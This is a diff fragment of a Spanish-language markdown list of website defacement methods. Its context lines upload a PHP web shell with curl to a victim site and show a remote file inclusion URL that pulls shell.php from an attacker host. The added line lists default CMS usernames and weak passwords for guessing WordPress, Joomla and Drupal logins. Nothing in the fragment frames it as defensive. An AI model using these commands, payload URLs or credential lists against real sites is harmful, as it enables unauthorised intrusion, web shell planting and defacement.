@@ -22,12 +22,13 @@ curl -F "file=@shell.php" http://victima.com/upload
 
 ## 5 - Metodo Vulnerabilidades en CMS (WordPress, Joomla, Drupal), credenciales debiles
 
+Usuarios: admin, wordpress, drupal, jomla, manager, administrator .. ,-  Claves: admin, joomla, drupal, wordpress, 123456, password
 
 ## 6.- Metodo remote File Inclusion (RFI) / Local File Inclusion (LFI)
 
 http://victima.com/index.php?page=http://atacante.com/shell.php
 
-
+#
 
 ## Defacement WEB suite por HTTP Method PUT OPTIONS POST OSVDB-397
 
